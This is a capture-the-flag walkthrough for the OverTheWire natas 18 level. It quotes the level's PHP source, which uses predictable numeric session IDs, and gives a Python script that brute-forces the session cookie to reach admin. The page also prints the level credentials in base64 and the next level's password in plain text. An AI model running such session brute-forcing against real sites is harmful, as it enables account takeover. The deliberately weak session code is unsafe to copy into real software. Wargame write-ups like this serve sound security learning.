---
title: natas 18 walkthrough
description: over the wire natas 18
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-18 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 18 walkthrough
    order: 30
---
## Description
> Username: natas18
> 
> URL:      http://natas18.natas.labs.overthewire.org
### Source Code
```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin()
{ 
    if ($_REQUEST["username"] == "admin") {
        /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
function isValidID($id)
{ 
    return is_numeric($id);
}
function createID($user)
{ 
    global $maxid;
    return rand(1, $maxid);
}

function debug($msg)
{ 
    if (array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function my_session_start()
{ 
    if (array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
        if (!session_start()) {
            debug("Session start failed");
            return false;
        } else {
            debug("Session start ok");
            if (!array_key_exists("admin", $_SESSION)) {
                debug("Session was old: admin flag set");
                $_SESSION["admin"] = 0; // backwards compatible, secure
            }
            return true;
        }
    }

    return false;
}

function print_credentials()
{ 
    if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas19\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}


$showform = true;
if (my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if (array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
        session_id(createID($_REQUEST["username"]));
        session_start();
        $_SESSION["admin"] = isValidAdminLogin();
        debug("New session started");
        $showform = false;
        print_credentials();
    }
}

if ($showform) {
}
?>
```

---
## Progress
### Observation
Using session ID to distinguish user identity. We need to pass `print_credentials`. Session ID seems to be an integer and inbetween $[1,640]$. Therefore, try all the session ID.
### Pwn
```python
import requests
from bs4 import BeautifulSoup

def request_with_session_id(id :int):
    request_with_cookie({
        "PHPSESSID" : str(id)
    })

def request_with_cookie(cookie):
    header = {
        "Authorization" : "Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==",
    }
    url = "http://natas18.natas.labs.overthewire.org/index.php"
    response = requests.get(url, headers=header, cookies=cookie)
    soup = BeautifulSoup(response.text, 'html.parser')
    content = soup.select('#content')
    if "You are an admin" in content.__str__():
        print(content)
    else:
        pass

def main():
    for i in range(1,641):
        request_with_session_id(i)

main()
```
8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s

---
## Hint

---
## Solving
### Category
- 
### Techniques
- 

### Tools
- 